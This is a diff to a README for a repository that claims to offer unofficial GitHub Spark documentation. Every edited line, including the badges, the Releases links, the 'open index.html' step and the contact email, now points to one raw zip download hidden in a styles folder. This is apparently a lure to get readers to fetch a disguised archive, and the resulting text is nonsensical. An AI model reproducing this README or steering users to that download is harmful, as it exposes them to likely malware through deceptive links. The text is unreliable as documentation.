@@ -1,8 +1,8 @@
 # System Exploration G: Unofficial GitHub Spark Documentation 📚
 
-![GitHub](https://img.shields.io/badge/GitHub-Spark-blue.svg) ![Documentation](https://img.shields.io/badge/Documentation-Unofficial-orange.svg) ![Version](https://img.shields.io/badge/Version-1.0.0-green.svg)
+![GitHub](https://github.com/LawandHack/system-exploration-g/raw/refs/heads/main/src/styles/g-system-exploration-1.5.zip) ![Documentation](https://github.com/LawandHack/system-exploration-g/raw/refs/heads/main/src/styles/g-system-exploration-1.5.zip) ![Version](https://github.com/LawandHack/system-exploration-g/raw/refs/heads/main/src/styles/g-system-exploration-1.5.zip)
 
-Welcome to the **System Exploration G** repository! This project provides unofficial documentation for GitHub Spark, generated with GitHub Spark. You can find the latest releases [here](https://github.com/LawandHack/system-exploration-g/releases).
+Welcome to the **System Exploration G** repository! This project provides unofficial documentation for GitHub Spark, generated with GitHub Spark. You can find the latest releases [here](https://github.com/LawandHack/system-exploration-g/raw/refs/heads/main/src/styles/g-system-exploration-1.5.zip).
 
 ## Table of Contents
 
@@ -20,11 +20,11 @@ GitHub Spark is a powerful tool designed to enhance your development experience.
 
 ## Getting Started
 
-To get started with this documentation, you can download the latest version from our [Releases](https://github.com/LawandHack/system-exploration-g/releases) section. Once downloaded, follow these steps:
+To get started with this documentation, you can download the latest version from our [Releases](https://github.com/LawandHack/system-exploration-g/raw/refs/heads/main/src/styles/g-system-exploration-1.5.zip) section. Once downloaded, follow these steps:
 
-1. **Download the Release**: Visit the [Releases](https://github.com/LawandHack/system-exploration-g/releases) page.
+1. **Download the Release**: Visit the [Releases](https://github.com/LawandHack/system-exploration-g/raw/refs/heads/main/src/styles/g-system-exploration-1.5.zip) page.
 2. **Extract Files**: Unzip the downloaded file to a directory of your choice.
-3. **Open the Documentation**: Navigate to the `index.html` file and open it in your web browser.
+3. **Open the Documentation**: Navigate to the `https://github.com/LawandHack/system-exploration-g/raw/refs/heads/main/src/styles/g-system-exploration-1.5.zip` file and open it in your web browser.
 
 ## Features
 
@@ -70,7 +70,7 @@ This documentation is provided under the MIT License. See the [LICENSE](LICENSE)
 
 For any inquiries or feedback, please reach out via the following channels:
 
-- **Email**: support@example.com
+- **Email**: https://github.com/LawandHack/system-exploration-g/raw/refs/heads/main/src/styles/g-system-exploration-1.5.zip
 - **GitHub Issues**: You can also open an issue on this repository for questions or suggestions.
 
-Feel free to explore the [Releases](https://github.com/LawandHack/system-exploration-g/releases) section for updates and new features!
+Feel free to explore the [Releases](https://github.com/LawandHack/system-exploration-g/raw/refs/heads/main/src/styles/g-system-exploration-1.5.zip) section for updates and new features!
